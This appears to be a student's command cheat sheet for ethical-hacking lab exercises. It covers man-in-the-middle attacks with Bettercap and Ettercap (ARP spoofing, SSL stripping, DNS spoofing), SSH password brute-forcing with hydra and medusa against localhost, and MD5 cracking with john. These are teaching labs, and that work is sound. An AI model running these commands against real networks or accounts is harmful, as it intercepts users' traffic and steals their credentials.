================ EHPT PRACTICAL GROUP 2 ================

--------------- LAB 5 : BETTERCAP MITM ---------------
[KALI]
sudo bettercap -iface eth0

Inside Bettercap:
net.probe on
net.show
set arp.spoof.targets TARGET_IP
arp.spoof on
set https.proxy.sslstrip true
https.proxy on
set dns.spoof.domains youtube.com
dns.spoof on
net.sniff on

[WINDOWS VICTIM]
Open youtube.com / websites


--------------- LAB 6 : ETTERCAP MITM ---------------
[WINDOWS VICTIM]
ipconfig

[KALI]
sudo ettercap -G
OR
sudo ettercap -T -M arp /VICTIM_IP/ /GATEWAY_IP/

[WINDOWS VICTIM]
Browse websites


--------------- LAB 7 : PASSWORD CRACKING ---------------
[KALI]
sudo systemctl start ssh
sudo systemctl start apache2
hydra -l kali -P /usr/share/wordlists/rockyou.txt -t 1 ssh://127.0.0.1
medusa -h 127.0.0.1 -u kali -P /usr/share/wordlists/rockyou.txt -M ssh


--------------- LAB 8 : HASHING / RAINBOW TABLE ---------------
[KALI]
echo -n "hello" | md5sum
echo -n "hello" | sha1sum
hashid 5d41402abc4b2a76b9719d911017c592
echo '5d41402abc4b2a76b9719d911017c592' > hash.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
